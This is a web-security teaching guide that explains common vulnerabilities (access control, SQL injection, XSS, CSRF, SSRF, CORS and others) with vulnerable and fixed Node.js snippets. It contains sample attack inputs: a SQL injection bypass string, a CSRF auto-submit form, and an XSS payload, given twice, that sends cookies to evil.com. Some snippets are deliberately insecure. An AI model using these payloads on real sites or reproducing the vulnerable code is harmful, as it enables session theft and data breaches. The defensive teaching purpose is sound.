# Broken Access Control
What it does?
Allows users to access data or actions they shouldn’t be allowed to.

Impact
Users can read other users’ data
Delete other accounts
Escalate privileges (user → admin)
Massive data breach
Real-World Example
User logs in and sees:
GET /api/orders?userId=123
Attacker changes it manually:
GET /api/orders?userId=456
If backend does not verify ownership → boom.
❌ Vulnerable Code
app.get("/api/orders", async (req, res) => {
  const { userId } = req.query;

  const orders = await db.query(
    "SELECT * FROM orders WHERE user_id = $1",
    [userId]
  );

  res.json(orders.rows);
});
We trust userId from user input.
✅ Secure Version
app.get("/api/orders", async (req, res) => {
  const loggedInUserId = req.user.id; // from session/auth middleware

  const orders = await db.query(
    "SELECT * FROM orders WHERE user_id = $1",
    [loggedInUserId]
  );

  res.json(orders.rows);
});
Prevention Intention
Never trust client-provided identifiers.
Authorization must be enforced server-side based on authenticated identity — not request parameters.

# Injection (SQL Injection)
What it does?
Allows attacker to manipulate database queries.

Impact
Data leak
Delete entire tables
Bypass login
Full DB compromise

Real-World Attack
Login form:
User enters:
email: admin@example.com' OR '1'='1
password: anything

Query becomes:
SELECT * FROM users 
WHERE email = 'admin@example.com' OR '1'='1'
❌ Vulnerable Code
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const query = `
    SELECT * FROM users 
    WHERE email = '${email}' AND password = '${password}'
  `;

  const result = await db.query(query);
});
This is deadly.

✅ Secure Version
app.post("/login", async (req, res) => {
  const { email, password } = req.body;

  const result = await db.query(
    "SELECT * FROM users WHERE email = $1",
    [email]
  );
});
Prevention Intention
Never construct queries using string concatenation.
Always separate:
Query structure
User data
Parameterized queries force DB to treat input as data, not code.
Parameterized queries Treats the entire input as one string value "anything' OR '1'='1"

| Database   | Placeholder Style |
| ---------- | ----------------- |
| PostgreSQL | `$1`, `$2`        |
| MySQL      | `?`               |
| SQL Server | `@paramName`      |

# Cross-Site Scripting (XSS)
What it does?
Injects malicious JavaScript into your app.

Impact
Steal session cookies
Modify DOM
Redirect users
Act as victim user
Real-World Example
Comment box:
User submits:
<script>
fetch("https://evil.com/steal?cookie=" + document.cookie)
</script>
If your app stores and renders it → every viewer gets hacked.
❌ Vulnerable Code (Express + EJS)
res.send(`
  <div>
    ${req.body.comment}
  </div>
`);
❌ DOM-Based XSS (Frontend)
const comment = new URLSearchParams(window.location.search).get("comment");
document.getElementById("output").innerHTML = comment;
✅ Secure Version
function escapeHTML(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}
res.send(`
  <div>
    ${escapeHTML(req.body.comment)}
  </div>
`);

Or in React:
<div>{comment}</div> // safe by default
Avoid:
<div dangerouslySetInnerHTML={{ __html: comment }} />
Prevention Intention
Never allow untrusted input to be interpreted as HTML or JavaScript.
Always:
Escape output
Treat user content as text, not markup

# Cross-Site Request Forgery (CSRF)
What it does?
Tricks user into performing unwanted actions while authenticated.

Impact
Delete account
Transfer money
Change email/password

Real-World Attack
Victim logged into bank.
Attacker sends them to:

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000">
  <input type="hidden" name="to" value="attacker">
</form>

<script>
document.forms[0].submit();
</script>
Browser auto-attaches cookies → bank thinks user initiated it.
❌ Vulnerable Backend
app.post("/transfer", (req, res) => {
  // no CSRF check
});

✅ Secure Version (CSRF Token Pattern)
When rendering page:
req.session.csrfToken = crypto.randomUUID();
Embed in form:
<input type="hidden" name="csrfToken" value="serverGeneratedToken">
Validate:
if (req.body.csrfToken !== req.session.csrfToken) {
  return res.status(403).send("Forbidden");
}
Prevention Intention
Ensure every state-changing request includes a secret value attacker cannot guess.
This proves request originated from your site.

# Security Misconfiguration
What it does?
Happens when the application, server, or HTTP layer is incorrectly configured.

Impact
Exposes admin panels
Reveals stack traces
Leaks sensitive headers
Enables attackers to discover internal structure
Real-World Example
User visits:
https://example.com/api/users
Instead of a clean error, they see:
Error: relation "users" does not exist
    at node_modules/pg/lib/query.js...
Now attacker knows:
You use PostgreSQL
Your table name
Your project structure
❌ Vulnerable Code
app.use((err, req, res, next) => {
  res.status(500).send(err.stack);
});
✅ Secure Version
app.use((err, req, res, next) => {
  console.error(err); // internal logging
  res.status(500).json({ message: "Internal server error" });
});
Prevention Intention
Never expose internal implementation details to the user.
Users should only see:
“Something went wrong”
Attackers should NOT see:
DB type
Stack trace
File paths
Framework versions

# Identification & Authentication Failures
What it does?
Weak login/session handling that allows attackers to impersonate users.
Impact
Account takeover
Session hijacking
Brute force attacks
Real-World Attack 1: Weak Password Logic

If your login checks:
if (password === user.password)
And passwords are stored plain text → database leak = full compromise.
Real-World Attack 2: Session ID Guessing

If session IDs are predictable:
session123
session124
Attacker brute forces sessions.
❌ Vulnerable Login
const user = await db.query(
  `SELECT * FROM users WHERE email='${email}'`
);
No hashing. No rate limit.
✅ Secure Approach
const user = await db.query(
  "SELECT * FROM users WHERE email=$1",
  [email]
);
const valid = await bcrypt.compare(password, user.password_hash);
if (!valid) return res.status(401).send("Invalid credentials");
Add:
Password hashing
Random session IDs
Session expiration
Login attempt throttling

Prevention Intention
Authentication must prove identity strongly.
Never:
Store passwords plain text
Use predictable sessions
Allow unlimited login attempts

# Cryptographic Failures
What it does?
Sensitive data is improperly encrypted or not encrypted at all.

Impact
Password leaks
Credit card leaks
Personal data exposure
Real-World Example
Database stores:
password: "mypassword123"
If DB leaks → immediate account takeover everywhere.
❌ Bad Practice
const user = {
  password: req.body.password
};
✅ Secure Practice
const hashed = await bcrypt.hash(req.body.password, 12);
Also:
Never send sensitive data over HTTP
Never store secrets in frontend code
Prevention Intention
Sensitive data should be useless even if attacker steals database.
Encryption protects in transit.
Hashing protects at rest.

# Insecure Design
What it does?
Flawed logic in business flow — even if code has no bugs.

Impact
Abuse of application logic
Discount manipulation
Free purchases
Real-World Example
Checkout flow:
Frontend sends:
{
  "price": 10,
  "productId": 5
}
Attacker changes price:

{
  "price": 1,
  "productId": 5
}
Backend trusts it.
❌ Vulnerable Code
app.post("/buy", (req, res) => {
  const { price } = req.body;
  chargeUser(price);
});
✅ Secure Version
app.post("/buy", async (req, res) => {
  const { productId } = req.body;

  const product = await db.query(
    "SELECT price FROM products WHERE id=$1",
    [productId]
  );
  chargeUser(product.rows[0].price);
});
Prevention Intention
Never trust client for business-critical values.
Client = display layer
Server = source of truth

# Software & Data Integrity Failures
What it does?
Using untrusted scripts or tampered dependencies.
Impact
Injected malicious code
Supply chain attack
Full frontend compromise
Real-World Example
Including script from CDN:
<script src="https://randomcdn.com/library.js"></script>
If CDN compromised → attacker runs arbitrary JS on your site.
✅ Secure Approach
Use Subresource Integrity:
<script
  src="https://cdn.com/library.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous">
</script>
Prevention Intention
Ensure external code has not been modified.
Browser verifies file hash before executing.

# Server-Side Request Forgery (SSRF)
What it does?
Forces server to make requests to internal/private resources.
Impact
Access internal APIs
Retrieve cloud metadata
Data leak
Real-World Example
App fetches URL:
app.get("/fetch", async (req, res) => {
  const response = await fetch(req.query.url);
});
Attacker sends:
/fetch?url=http://localhost:5000/admin
Now your server accesses internal service.
✅ Secure Version
Whitelist domains:
const allowedDomains = ["api.example.com"];
const url = new URL(req.query.url);
if (!allowedDomains.includes(url.hostname)) {
  return res.status(400).send("Invalid URL");
}
Prevention Intention
Server should never fetch arbitrary user-provided URLs.
Allow only trusted destinations.

# CORS Misconfiguration
Problem
If you allow:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Any site can send authenticated requests.
Secure Approach
Allow only trusted origins:
if (req.headers.origin === "https://myapp.com") {
  res.setHeader("Access-Control-Allow-Origin", req.headers.origin);
}
Intention
Only your frontend should access your API with credentials.

# Clickjacking
Attacker embeds your site:
<iframe src="https://bank.com"></iframe>
Tricks user into clicking hidden buttons.
Prevention
Send header:
X-Frame-Options: DENY
or
Content-Security-Policy: frame-ancestors 'none'
Intention
Prevent your site from being embedded elsewhere.

# Rate Limiting
Attacker tries:
1000 login attempts
OTP brute force
Password guessing
Prevention Logic

Track attempts:
if (loginAttempts > 5) {
  return res.status(429).send("Too many attempts");
}
Intention
Slow down attackers.
Make brute force impractical.

# Content Security Policy (CSP)
What it does?
CSP is a browser security mechanism that restricts:
Where scripts can load from
Where images can load from
Whether inline scripts are allowed
Whether eval() is allowed
Whether your site can be framed
It tells the browser:
“Only execute resources from these trusted places.”
How It Impacts the Application

If you don’t have CSP:
Any injected script executes immediately
One XSS = full account takeover
Malicious third-party script compromises entire app
If you have strong CSP:
Even if XSS happens, injected scripts often won’t run
Think of CSP as a damage limiter.
Real-World Attack Scenario (Without CSP)
User profile page allows storing bio:
Attacker stores:
<script>
fetch("https://evil.com/steal?cookie=" + document.cookie)
</script>
If your app renders it → script executes.
Browser does not question it.

Basic CSP Implementation
Send header:
Content-Security-Policy: default-src 'self';
This means:
Only load resources from same origin
Block external scripts
Block inline scripts